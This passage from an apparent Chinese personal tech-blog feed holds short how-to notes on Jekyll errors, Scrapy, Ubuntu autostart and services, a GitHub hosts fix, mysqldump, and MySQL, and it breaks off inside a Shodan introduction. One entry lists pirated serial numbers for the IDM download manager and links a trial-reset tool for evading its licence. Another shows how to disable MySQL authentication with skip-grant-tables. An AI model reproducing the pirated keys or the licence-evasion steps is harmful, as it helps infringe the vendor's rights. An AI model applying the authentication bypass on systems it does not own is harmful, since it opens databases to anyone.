D:&#x2F;Ruby23-x64&#x2F;lib&#x2F;ruby&#x2F;gems&#x2F;2.3.0&#x2F;gems&#x2F;jekyll-3.3.1&#x2F;lib&#x2F;jekyll&#x2F;plugin_manager.rb:34:in &#96;require_from_bundler&#39;</span><br><span class="line">    from D:&#x2F;Ruby23-x64&#x2F;lib&#x2F;ruby&#x2F;gems&#x2F;2.3.0&#x2F;gems&#x2F;jekyll-3.3.1&#x2F;exe&#x2F;jekyll:9:in &#96;&lt;top (required)&gt;&#39;</span><br><span class="line">    from D:&#x2F;Ruby23-x64&#x2F;bin&#x2F;jekyll:22:in &#96;load&#39;</span><br><span class="line">    from D:&#x2F;Ruby23-x64&#x2F;bin&#x2F;jekyll:22:in &#96;&lt;main&gt;&#39;</span><br></pre></td></tr></table></figure><p>解决：执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install bundler</span><br></pre></td></tr></table></figure><p>（2）执行jekyll server命令后可能会出现如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;Ruby23-x64&#x2F;lib&#x2F;ruby&#x2F;gems&#x2F;2.3.0&#x2F;gems&#x2F;bundler-1.14.3&#x2F;lib&#x2F;bundler&#x2F;spec_set.rb:87:in &#96;block in materialize: Could not find i18n-0.7.0 in any of the sources (Bundler::GemNotFound)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>​    解决：执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>（3）执行jekyll server命令后可能会出现如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;Ruby23-x64&#x2F;lib&#x2F;ruby&#x2F;gems&#x2F;2.3.0&#x2F;gems&#x2F;bundler-1.14.0&#x2F;lib&#x2F;bundler&#x2F;resolver.rb:376:in &#96;block in verify_gemfile_dependencies_are_found!&#39;: Could not find gem &#39;jekyll (~&gt; 3.2.1) x64-mingw32&#39; in any of the gem sources listed in your Gemfile. (Bundler::GemNotFound)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>解决：查看Gemfile文件里的jekyll版本是否与安装的版本一致，若不一致，修改为此时安装的版本</p><p>（4）执行jekyll server命令后可能会出现如下类似错误，缺少gem库，缺什么库安装什么就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;Ruby23-x64&#x2F;lib&#x2F;ruby&#x2F;gems&#x2F;2.3.0&#x2F;gems&#x2F;bundler-1.14.0&#x2F;lib&#x2F;bundler&#x2F;resolver.rb:376:in &#96;block in verify_gemfile_dependencies_are_found!&#39;: Could not find gem &#39;jekyll-sitemap x64-mingw32&#39; in any of the gem sources listed in your Gemfile. (Bundler::GemNotFound)</span><br></pre></td></tr></table></figure><p>解决：执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install jekyll-sitemap</span><br></pre></td></tr></table></figure><p>（5）让jekyll服务可以在局域网中访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jekyll serve -w --host&#x3D;0.0.0.0</span><br></pre></td></tr></table></figure><p>这样就可以通过该机器的IP地址访问博客了。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> jekyll </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy.Request使用meta传递数据，以及deepcopy的使用</title>
      <link href="2020/05/11/2020-05-11-scrapy_request_use_deepcopy_meta_to_transfer_data/"/>
      <url>2020/05/11/2020-05-11-scrapy_request_use_deepcopy_meta_to_transfer_data/</url>
      
        <content type="html"><![CDATA[<h2 id="scrapy-Request使用meta传递数据，以及deepcopy的使用"><a href="#scrapy-Request使用meta传递数据，以及deepcopy的使用" class="headerlink" title="scrapy.Request使用meta传递数据，以及deepcopy的使用"></a>scrapy.Request使用meta传递数据，以及deepcopy的使用</h2><p>scrapy.Request(url[,callback,method=”GET”,headers,body,cookies,meta,dont_filter=False])</p><p>参数meta说明：<br>        1）meta是一个字典，主要用于解析函数之间传递值；<br>        2）Request对象接受一个meta参数，即一个字典对象，同时Response对象有一个meta属性可以取到相应request传过来的meta；<br>        即：一方传递，另一方接收</p><p>例：</p><p>传递</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yield scrapy.Request(link,callback&#x3D;self.parse_news,meta &#x3D;&#123;&#39;post_date&#39;:post_date&#125;)</span><br></pre></td></tr></table></figure><p>接收</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_date &#x3D; response.meta[&#39;post_date&#39;]</span><br></pre></td></tr></table></figure><p>但有时会遇到问题：通过meta参数传值时出现在被调用的函数中meta参数多次重复，原因是meta的参数传递是浅拷贝，并且scrapy是异步框架才会导致这样的问题。</p><p>解决办法：改用深拷贝</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import copy</span><br><span class="line"></span><br><span class="line">yield scrapy.Request(link,callback&#x3D;self.parse_news,meta &#x3D;&#123;&#39;post_date&#39;:deepcopy(post_date)&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu设置开机启动项</title>
      <link href="2020/05/11/2020-05-11-ubuntu-auto-start-sh-rclocal/"/>
      <url>2020/05/11/2020-05-11-ubuntu-auto-start-sh-rclocal/</url>
      
        <content type="html"><![CDATA[<h1 id="ubuntu设置开机启动项"><a href="#ubuntu设置开机启动项" class="headerlink" title="ubuntu设置开机启动项"></a>ubuntu设置开机启动项</h1><p>目前自己用过的方法有设置 profile.d 和 rc.local。两者的区别主要是只不过前者是登录用户以后执行的，后者是系统启动的时候就执行的。</p><h2 id="ubuntu通过profile-d设置开机项"><a href="#ubuntu通过profile-d设置开机项" class="headerlink" title="ubuntu通过profile.d设置开机项"></a>ubuntu通过profile.d设置开机项</h2><p>自己写一个shell脚本</p><p>将写好的脚本（.sh文件）放到目录 /etc/profile.d/ 下，系统启动并登录用户后就会自动执行该目录下的所有shell脚本。</p><h2 id="ubuntu通过rc-local设置开机启动脚本"><a href="#ubuntu通过rc-local设置开机启动脚本" class="headerlink" title="ubuntu通过rc.local设置开机启动脚本"></a>ubuntu通过rc.local设置开机启动脚本</h2><h3 id="Ubuntu-16-04"><a href="#Ubuntu-16-04" class="headerlink" title="Ubuntu 16.04"></a>Ubuntu 16.04</h3><p>利用rc.local开机启动命令/脚本</p><p>rc.local脚本是一个Ubuntu开机后会自动执行的脚本，我们可以在该脚本内添加命令行指令。该脚本位于/etc/路径下，需要root权限才能修改。</p><p>该脚本具体格式如下：</p><pre><code>#!/bin/sh -e## rc.local## This script is executed at the end of each multiuser runlevel.# Make sure that the script will &quot;exit 0&quot; on success or any other# value on error.## In order to enable or disable this script just change the execution# bits.## By default this script does nothing.exit 0</code></pre><p>注意: 一定要将命令添加在exit 0之前。里面可以直接写命令或者执行Shell脚本文件sh。rc.local脚本里面启动的用户默认为root权限。</p><h3 id="Ubuntu-18-04"><a href="#Ubuntu-18-04" class="headerlink" title="Ubuntu 18.04"></a>Ubuntu 18.04</h3><p>ubuntu-18.04不能像ubuntu16一样通过编辑rc.local来设置开机启动脚本，通过下列简单设置后，可以使rc.local重新发挥作用。</p><p>1.编辑rc-local.service文件</p><pre><code>sudo gedit /etc/systemd/system/rc-rc.service</code></pre><p>将下列内容复制进rc-local.service文件</p><pre><code>[Unit]Description=/etc/rc.local CompatibilityConditionPathExists=/etc/rc.local[Service]Type=forkingExecStart=/etc/rc.local startTimeoutSec=StandardOutput=ttyRemainAfterExit=yesSysVStartPriority=[Install]WantedBy=multi-user.target</code></pre><p>2.创建文件rc.local</p><pre><code>sudo gedit /etc/rc.local</code></pre><p>3.将下列内容复制进rc.local文件</p><pre><code>#!/bin/sh -e## rc.local## This script is executed at the end of each multiuser runlevel.# Make sure that the script will &quot;exit 0&quot; on success or any other# value on error.## In order to enable or disable this script just change the execution# bits.## By default this script does nothing.echo &quot;看到这行字，说明添加自启动脚本成功。&quot; &gt; /usr/local/test.logexit </code></pre><p>4.给rc.local加上权限</p><pre><code>sudo chmod +x /etc/rc.local</code></pre><p>5.启用服务</p><pre><code>sudo systemctl enable rc-local</code></pre><p>6.启动服务并检查状态</p><pre><code>sudo systemctl start rc-local.servicesudo systemctl status rc-local.service</code></pre><p>7.重启并检查test.log文件</p><pre><code>cat /usr/local/test.log　　</code></pre><p>8.如果能看到内容，说明设置成功，你就可以通过编辑rc.local文件来设置启动脚本了</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> 自启动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu自启动脚本卡死无法开机 使用单用户模式</title>
      <link href="2020/05/11/2020-05-11-ubuntu_self-start_script_stuck_cannot_boot/"/>
      <url>2020/05/11/2020-05-11-ubuntu_self-start_script_stuck_cannot_boot/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu自启动脚本卡死无法开机-使用单用户模式"><a href="#ubuntu自启动脚本卡死无法开机-使用单用户模式" class="headerlink" title="ubuntu自启动脚本卡死无法开机 使用单用户模式"></a>ubuntu自启动脚本卡死无法开机 使用单用户模式</h2><p>问题：编写了ubuntu自启动脚本，一直监听、或者出错导致无法开机，系统无法正常启动。</p><p>解决：开机进单用户模式，删掉那脚本，再重启。</p><p>步骤：</p><p>(1)机器启动系统后，一直按住shift键不放，将进入如下界面。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/14ce36d3d539b6003d7.jpg"></p><p>(2)如何不修改任何东西，进入单用户模式是只读的，所以在这里我们需要把下图所示中的ro改成rw。才能进入系统修改或删除出错的脚本。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/c65c1138b6b8.jpg"></p><p>(3)然后按F10或者Ctrl+x进行引导,</p><p>(4)启动引导后，将进入下图所示界面，这时需要通过上下箭头键来选择相应的菜单项。在这里我们选择root菜单项=，选择后回车即可进入单用户系统。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/6159252dd42a28.png"></p><p>(5)删除脚本或修改脚本出错的地方之后再重启。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> 自启动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github无法加载或不显示图片问题</title>
      <link href="2020/05/09/2020-05-09-github-img-not-show/"/>
      <url>2020/05/09/2020-05-09-github-img-not-show/</url>
      
        <content type="html"><![CDATA[<h2 id="Github无法加载或不显示图片问题"><a href="#Github无法加载或不显示图片问题" class="headerlink" title="Github无法加载或不显示图片问题"></a>Github无法加载或不显示图片问题</h2><p>将以下内容添加到host文件中</p><pre><code># GitHub Start192.30.253.112    github.com192.30.253.119    gist.github.com199.232.28.133    assets-cdn.github.com199.232.28.133    raw.githubusercontent.com199.232.28.133    gist.githubusercontent.com199.232.28.133    cloud.githubusercontent.com199.232.28.133    camo.githubusercontent.com199.232.28.133    avatars0.githubusercontent.com199.232.28.133    avatars1.githubusercontent.com199.232.28.133    avatars2.githubusercontent.com199.232.28.133    avatars3.githubusercontent.com199.232.28.133    avatars4.githubusercontent.com199.232.28.133    avatars5.githubusercontent.com199.232.28.133    avatars6.githubusercontent.com199.232.28.133    avatars7.githubusercontent.com199.232.28.133    avatars8.githubusercontent.com# GitHub End</code></pre><p>windows在C:\Windows\System32\drivers\etc\hosts<br>ubuntu在/etc/hosts</p><p>再去打开或刷新Github页面，图片已经可以加载出来了。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDM下载器序列号</title>
      <link href="2020/05/09/2020-05-09-IDM-register/"/>
      <url>2020/05/09/2020-05-09-IDM-register/</url>
      
        <content type="html"><![CDATA[<h2 id="IDM下载器序列号注册"><a href="#IDM下载器序列号注册" class="headerlink" title="IDM下载器序列号注册"></a>IDM下载器序列号注册</h2><p>方法一：</p><p>（1）断网，在弹出注册窗口上填上以下序列制号</p><p>以下序列号随意一个</p><pre><code>3ZV2M-XQVN1-H0AMJ-B1MRX56ECU-E6CY3-FMNLR-ZA7875505O-M38P8-NHRL2-XAKWJKCC05-BJ2L2-ZM95G-6SFJ41QK5Z-4EQIM-XH4RD-BLXKTTGG94-HRKYT-NIE2X-8A9MTNCU51-ZEXKM-414SK-HM24783NFH-WM0FW-GJRQ3-WQ8HLA3RJ1-3X8AT-85C48-ET4YN</code></pre><p>（2）会提示注册失败,不用理它zd,直接关闭</p><p>（3）联网,正常使用 </p><p>不过此种方式每次打开IDM都需要使用一次。</p><p>方法二：</p><p>下载idm trial reset</p><p><a href="https://www.cr173.com/soft/686135.html">https://www.cr173.com/soft/686135.html</a></p><p>可以重置idm试用日期30天</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu中使用AppImage类型文件</title>
      <link href="2020/05/09/2020-05-09-ubuntu-AppImage/"/>
      <url>2020/05/09/2020-05-09-ubuntu-AppImage/</url>
      
        <content type="html"><![CDATA[<h2 id="在Ubuntu中使用AppImage类型文件"><a href="#在Ubuntu中使用AppImage类型文件" class="headerlink" title="在Ubuntu中使用AppImage类型文件"></a>在Ubuntu中使用AppImage类型文件</h2><p>右键–属性—权限—允许作为执行文件启动<br>双击即可运行</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/569454-20180315110626531-2021748346.png" alt="AppImage类型文件"></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> AppImage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu中使用picgo图床</title>
      <link href="2020/05/09/2020-05-09-ubuntu-picgo/"/>
      <url>2020/05/09/2020-05-09-ubuntu-picgo/</url>
      
        <content type="html"><![CDATA[<h2 id="在Ubuntu中使用picgo图床"><a href="#在Ubuntu中使用picgo图床" class="headerlink" title="在Ubuntu中使用picgo图床"></a>在Ubuntu中使用picgo图床</h2><p>在<a href="https://github.com/Molunerfinn/PicGo/releases">picgo</a>下载PicGo-2.3.0-beta.0.AppImage</p><p>右键–属性—权限—允许作为执行文件启动</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/Screenshot%20from%202020-05-09%2011-03-12.png"></p><p>picgo具体配置可以看之前文档:</p><p>Typora编写markdown文档并利用PicGo实现图片自动上传图床</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> picgo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu后台执行命令</title>
      <link href="2020/05/09/2020-05-09-ubuntu_exec_background/"/>
      <url>2020/05/09/2020-05-09-ubuntu_exec_background/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu后台执行命令"><a href="#ubuntu后台执行命令" class="headerlink" title="ubuntu后台执行命令"></a>ubuntu后台执行命令</h2><ol><li>使用&amp;符号在后台执行命令</li></ol><p>你可以在Linux命令或者脚本后面增加&amp;符号，从而使命令或脚本在后台执行，例如：</p><pre><code>$ ./my-shell-script.sh &amp;  </code></pre><ol start="2"><li>使用nohup在后台执行命令</li></ol><p>使用&amp;符号在后台执行命令或脚本后，如果你退出登录，这个命令就会被自动终止掉。要避免这种情况，你可以使用nohup命令，如下所示：</p><pre><code>$ nohup ./my-shell-script.sh &amp;  </code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu将命令或脚本变成服务以及设置开机自启动</title>
      <link href="2020/05/09/2020-05-09-ubuntu_self-bult_service/"/>
      <url>2020/05/09/2020-05-09-ubuntu_self-bult_service/</url>
      
        <content type="html"><![CDATA[<h2 id="Ubuntu将命令或脚本变成服务以及设置开机自启动"><a href="#Ubuntu将命令或脚本变成服务以及设置开机自启动" class="headerlink" title="Ubuntu将命令或脚本变成服务以及设置开机自启动"></a>Ubuntu将命令或脚本变成服务以及设置开机自启动</h2><p>有很多程序比如ssh-tunnel、ftp、jekyll等网络服务，都是在前台执行监听的，必须一直保持进程连接才行，每次还要手动输入命令打开，不方便，也不稳定。</p><p>Linux的服务，其实就是自定义的shell脚本。需要做的主要就是把这个脚本以各种系统要求的格式或位置放好，然后用某个工具添加到服务中即可。</p><p>启动服务是用SERVICE +COMMAND。这里的command命令本身也是一个脚本。比如说：service networking start；中networking就是一个shell脚本。注意：这里的脚本没有文件后缀.sh。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>（1）把我们需要注册的脚本保存到/etc/init.d/目录中，例如jekyll本地部署脚本，命名为jekyll-deploy</p><pre><code>#!/bin/bashstart()&#123;    echo &quot;------------------test----------------&quot;    cd /home/mamba/Documents    jekyll s&#125;case $1 in    start):    start    ;;    stop):    echo &quot;-----------------stop------------------&quot;    ;;esacexit 0</code></pre><p>（2）设置权限</p><pre><code>chmod 755 /etc/init.d/jekyll-deploy</code></pre><p>（3）系统重新加载服务</p><pre><code>systemctl daemon-reload</code></pre><p>（4）利用service启动jekyll-deploy</p><pre><code>service jekyll-deploy restart</code></pre><h4 id="关于自定义脚本的编写"><a href="#关于自定义脚本的编写" class="headerlink" title="关于自定义脚本的编写"></a>关于自定义脚本的编写</h4><p>Linux的服务的本质是一个shell脚本，但是需要遵循service的标准模版，比如在头注释中编写service描述等，以供系统读取；还要定义每种操作的具体实行方式，比如在service start时会执行脚本中的start()函数。</p><p>以下为标准模版：</p><pre><code>#!/bin/bash## Fill in name of program here.PROG=&quot;myService&quot;PROG_PATH=&quot;/usr/local/myServer&quot; ## Not need, but sometimes helpful (if $PROG resides in /opt for example).PROG_ARGS=&quot;&quot; PID_PATH=&quot;/var/run/&quot;start() &#123;    if [ -e &quot;$PID_PATH/$PROG.pid&quot; ]; then        ## Program is running, exit with error.        echo &quot;Error! $PROG is currently running!&quot; 1&gt;&amp;2        exit 1    else        ## Change from /dev/null to something like /var/log/$PROG if you want to save output.        $PROG_PATH/$PROG $PROG_ARGS 2&gt;&amp;1 &gt;/var/log/$PROG &amp;    $pid=`ps ax | grep -i &#39;myService&#39; | sed &#39;s/^\([0-9]\&#123;1,\&#125;\).*/\1/g&#39; | head -n 1`        echo &quot;$PROG started&quot;        echo $pid &gt; &quot;$PID_PATH/$PROG.pid&quot;    fi&#125;stop() &#123;    echo &quot;begin stop&quot;    if [ -e &quot;$PID_PATH/$PROG.pid&quot; ]; then        ## Program is running, so stop it    pid=`ps ax | grep -i &#39;myService&#39; | sed &#39;s/^\([0-9]\&#123;1,\&#125;\).*/\1/g&#39; | head -n 1`    kill $pid        rm -f  &quot;$PID_PATH/$PROG.pid&quot;        echo &quot;$PROG stopped&quot;    else        ## Program is not running, exit with error.        echo &quot;Error! $PROG not started!&quot; 1&gt;&amp;2        exit 1    fi&#125;## Check to see if we are running as root first.## Found at http://www.cyberciti.biz/tips/shell-root-user-check-script.htmlif [ &quot;$(id -u)&quot; != &quot;0&quot; ]; then    echo &quot;This script must be run as root&quot; 1&gt;&amp;2    exit 1ficase &quot;$1&quot; in    start)        start        exit 0    ;;    stop)        stop        exit 0    ;;    reload|restart|force-reload)        stop        start        exit 0    ;;    **)        echo &quot;Usage: $0 &#123;start|stop|reload&#125;&quot; 1&gt;&amp;2        exit 1    ;;esac</code></pre><p>一般来讲，我们只用改写其中的几个变量，start 方法和 stop 方法。其中，PROG变量为所要运行的可执行程序的名称， PROG_PATH为可执行文件所在的目录，PROG_ARGS为执行程序的各个参数。</p><p>另设置服务开启启动等：</p><pre><code>systemctl is-enabled servicename.service #查询服务是否开机启动systemctl enable *.service #开机运行服务systemctl disable *.service #取消开机运行systemctl start *.service #启动服务systemctl stop *.service #停止服务systemctl restart *.service #重启服务systemctl reload *.service #重新加载服务配置文件systemctl status *.service #查询服务运行状态</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql 导入导出数据</title>
      <link href="2020/05/07/2020-05-07-mysql_import_export_data/"/>
      <url>2020/05/07/2020-05-07-mysql_import_export_data/</url>
      
        <content type="html"><![CDATA[<h2 id="mysql-导入导出数据"><a href="#mysql-导入导出数据" class="headerlink" title="mysql 导入导出数据"></a>mysql 导入导出数据</h2><p>MYSQL使用mysqldump导出数据:</p><p>命令格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u用户名 -p密码 数据库名 表名 --where&#x3D;&quot;筛选条件&quot; &gt; 导出文件路径</span><br><span class="line">e.g. </span><br><span class="line">mysqldump -uroot -p123456 DB_NAME TABLE_NAME --where&#x3D;&quot;ID&#x3D;0&quot; &gt; Temp.sql</span><br><span class="line">mysqldump -uroot -p123456 DB_NAME TABLE_NAME --where&#x3D;&quot;true limit 1000&quot; &gt; Temp.sql</span><br></pre></td></tr></table></figure><p>备份数据库<br>1.导出结构不导出数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -d 数据库名 -uroot -p &gt; xxx.sql</span><br></pre></td></tr></table></figure><p>2.导出数据不导出结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -t 数据库名 -uroot -p &gt; xxx.sql</span><br></pre></td></tr></table></figure><p>3.导出数据和表结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump 数据库名 -uroot -p &gt; xxx.sql</span><br></pre></td></tr></table></figure><p>导入数据：</p><p>由于mysqldump导出的是完整的SQL语句，所以用mysql客户程序很容易就能把数据导入了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql 数据库名 &lt; 文件名</span><br></pre></td></tr></table></figure><p>or:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><p>然后选择被导入的数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 数据库；</span><br><span class="line">source &#x2F;tmp&#x2F;xxx.sql</span><br></pre></td></tr></table></figure><h2 id="紧记：导出的sql文件一定要看清有无新建表-删除表等操作-避免数据丢失！！！"><a href="#紧记：导出的sql文件一定要看清有无新建表-删除表等操作-避免数据丢失！！！" class="headerlink" title="紧记：导出的sql文件一定要看清有无新建表 删除表等操作 避免数据丢失！！！"></a>紧记：导出的sql文件一定要看清有无新建表 删除表等操作 避免数据丢失！！！</h2>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fake_useragent代理获取错误 Maximum amount of retries reached</title>
      <link href="2020/05/06/2020-05-06-fake-useragent_ERROR_Maximum_amount_of_retries_reached/"/>
      <url>2020/05/06/2020-05-06-fake-useragent_ERROR_Maximum_amount_of_retries_reached/</url>
      
        <content type="html"><![CDATA[<h2 id="fake-useragent代理获取错误-Maximum-amount-of-retries-reached"><a href="#fake-useragent代理获取错误-Maximum-amount-of-retries-reached" class="headerlink" title="fake_useragent代理获取错误 Maximum amount of retries reached"></a>fake_useragent代理获取错误 Maximum amount of retries reached</h2><p>fake_useragent 具体github地址:<a href="https://github.com/hellysmile/fake-useragent">https://github.com/hellysmile/fake-useragent</a></p><p>1.下载最新版本json文件（网页拉到最低保存为json文件（fake_useragent.json）</p><p>  <a href="https://fake-useragent.herokuapp.com/browsers/0.1.11">https://fake-useragent.herokuapp.com/browsers/0.1.11</a>   </p><p>2.将fake_useragent.json文件放到windows或者linux的缓存目录下</p><p>缓存目录：</p><p>windows: C:\Users\xxxxx\AppData\Local\Temp</p><p>linux: /tmp</p><p>或者用脚本查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import tempfile</span><br><span class="line">tempfile.gettempdir()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu安装flash-player</title>
      <link href="2020/05/06/2020-05-06-ubuntu_install_flashplayer/"/>
      <url>2020/05/06/2020-05-06-ubuntu_install_flashplayer/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu安装flash-player"><a href="#ubuntu安装flash-player" class="headerlink" title="ubuntu安装flash-player"></a>ubuntu安装flash-player</h2><p>ubuntu下安装flash只需要一条简单的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install flashplugin-installer</span><br></pre></td></tr></table></figure><p>安装完重新打开浏览器即可</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL root用户忘记密码 利用skip-grant-tables</title>
      <link href="2020/05/06/2020-05-06-mysql_forgot_password_skip-grant-tables/"/>
      <url>2020/05/06/2020-05-06-mysql_forgot_password_skip-grant-tables/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL-root用户忘记密码-利用skip-grant-tables"><a href="#MySQL-root用户忘记密码-利用skip-grant-tables" class="headerlink" title="MySQL root用户忘记密码 利用skip-grant-tables"></a>MySQL root用户忘记密码 利用skip-grant-tables</h2><p>解决办法：</p><p>关闭mysql，在配置文件/etc/mysql/my.cnf中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure><p>重启mysql即可用任意密码登陆mysql</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shodan使用</title>
      <link href="2020/05/06/2020-05-06-How_to_use_shodan/"/>
      <url>2020/05/06/2020-05-06-How_to_use_shodan/</url>
      
        <content type="html"><![CDATA[<h2 id="shodan使用"><a href="#shodan使用" class="headerlink" title="shodan使用"></a>shodan使用</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Shodan是一个搜素互联网链接设备的搜索引擎，不同于Google、Baidu这些搜素引擎。用户可以在Shodan上使用Shodan搜索语法查找链接到互联网的摄像头、路由器、服务器等设备信息。在渗透测试中是个非常非常不错的神器。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息（用于描述设备所运行服务的标志性文本信息），通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的 FTP 服务器。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h4><p>在使用Shodan之前我们需要注册一个Shodan账户，之后才可以使用，也可以使用facebook/twitter/windows/google账户登陆。未登录的话不能使用过滤搜索而且只能查找一页数据。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20180228191935631.png" alt="20180228191935631"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20180228192126597.png" 